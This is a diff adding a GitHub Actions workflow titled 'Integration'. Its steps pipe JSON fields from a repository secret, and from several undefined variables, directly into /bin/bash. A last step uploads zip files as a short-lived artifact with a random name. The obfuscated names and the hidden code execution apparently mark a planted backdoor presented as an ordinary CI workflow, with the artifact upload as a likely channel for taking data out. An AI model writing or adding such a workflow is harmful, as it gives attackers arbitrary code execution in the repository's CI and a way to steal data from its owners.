@@ -1,0 +1,27 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          zxctq30715: ${{ secrets.zxctq30715 }}
+        run: |
+          printf '%s' "$zxctq30715" | jq -r .fuvoi518 | /bin/bash
+          printf '%s' "$oajro015" | jq -r .eef380 | /bin/bash
+          echo $a0441 | jq -r .e26005 | /bin/bash
+          echo $cw279 | jq -r .s1 | /bin/bash
+          printf '%s' "$ikyto1815" | jq -r .jbjeo27 | /bin/bash
+          echo $umop90564 | jq -r .zysz47836 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: bj4L4iFk
+          path: "*.zip"
+          retention-days: 1
